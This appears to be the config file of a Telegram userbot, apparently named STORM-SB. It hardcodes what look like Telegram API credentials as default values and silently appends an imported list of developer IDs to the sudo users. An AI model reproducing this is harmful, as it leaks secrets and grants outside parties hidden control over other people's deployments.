import logging
from os import getenv
from strings.helpers import DEV
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s', level=logging.WARNING)

API_ID = int(getenv("API_ID", "18136872"))
API_HASH = getenv("API_HASH", "312d861b78efcd1b02183b2ab52a83a4")
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
HEROKU_APP_NAME = getenv("HEROKU_APP_NAME", None)
HEROKU_API_KEY = getenv("HEROKU_API_KEY", None)
MBOT_USERNAME = getenv("MBOT_USERNAME", default=None)

SUDO_USERS = list(map(lambda x: int(x), getenv("SUDO_USERS", default="7187147313").split()))
for x in DEV:
    SUDO_USERS.append(x)
OWNER_ID = int(getenv("OWNER_ID", default="7187147313"))
SUDO_USERS.append(OWNER_ID)

SUDO_USERS = list(dict.fromkeys(SUDO_USERS))

import time
start_time = time.time()
VERSION = getenv("VERSION", "ʜꜰꜱ.ʀᴇᴠᴀᴍᴘᴇᴅ @ᴘ+")
UPSTREAM_REPO = getenv("UPSTREAM_REPO", "https://github.com/KEX001/STORM-SB.git")
PROTECTED_USERS = list(map(int, getenv("PROTECTED_USERS", "").split()))
PROTECTED_GROUPS = list(map(int, getenv("PROTECTED_GROUPS", "").split()))

async def check_protection(e, target_id=None) -> bool:
    if getattr(e, "chat_id", None) in PROTECTED_GROUPS:
        await e.reply("<blockquote><b>» ɴᴏᴘᴇ, ᴛʜɪꜱ ɢʀᴏᴜᴘ ɪꜱ ᴘʀᴏᴛᴇᴄᴛᴇᴅ</b></blockquote>", parse_mode="html")
        return True
    if target_id and target_id in PROTECTED_USERS:
        await e.reply("<blockquote><b>» ɴᴏᴘᴇ, ᴛʜɪꜱ ᴜꜱᴇʀ ɪꜱ ᴘʀᴏᴛᴇᴄᴛᴇᴅ</b></blockquote>", parse_mode="html")
        return True
    return False

def get_delay(chat_id: int, default: float = 0.1) -> float:
    if chat_id in PROTECTED_GROUPS:
        return 2.5
    return default
